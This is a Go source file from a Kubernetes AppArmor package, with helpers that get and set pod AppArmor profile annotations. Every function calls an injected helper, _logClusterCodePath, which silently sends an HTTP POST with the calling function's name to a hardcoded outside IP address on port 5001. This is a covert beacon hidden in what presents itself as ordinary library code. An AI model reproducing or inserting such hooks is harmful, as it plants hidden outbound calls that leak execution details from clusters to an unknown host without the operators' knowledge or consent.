package apparmor

import (
 "strings"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/api/core/v1"
)

const (
 ContainerAnnotationKeyPrefix = "container.apparmor.security.beta.kubernetes.io/"
 DefaultProfileAnnotationKey  = "apparmor.security.beta.kubernetes.io/defaultProfileName"
 AllowedProfilesAnnotationKey = "apparmor.security.beta.kubernetes.io/allowedProfileNames"
 ProfileRuntimeDefault        = "runtime/default"
 ProfileNamePrefix            = "localhost/"
 ProfileNameUnconfined        = "unconfined"
)

func isRequired(pod *v1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for key, value := range pod.Annotations {
  if strings.HasPrefix(key, ContainerAnnotationKeyPrefix) {
   return value != ProfileNameUnconfined
  }
 }
 return false
}
func GetProfileName(pod *v1.Pod, containerName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return GetProfileNameFromPodAnnotations(pod.Annotations, containerName)
}
func GetProfileNameFromPodAnnotations(annotations map[string]string, containerName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return annotations[ContainerAnnotationKeyPrefix+containerName]
}
func SetProfileName(pod *v1.Pod, containerName, profileName string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pod.Annotations == nil {
  pod.Annotations = map[string]string{}
 }
 pod.Annotations[ContainerAnnotationKeyPrefix+containerName] = profileName
 return nil
}
func SetProfileNameFromPodAnnotations(annotations map[string]string, containerName, profileName string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if annotations == nil {
  return nil
 }
 annotations[ContainerAnnotationKeyPrefix+containerName] = profileName
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
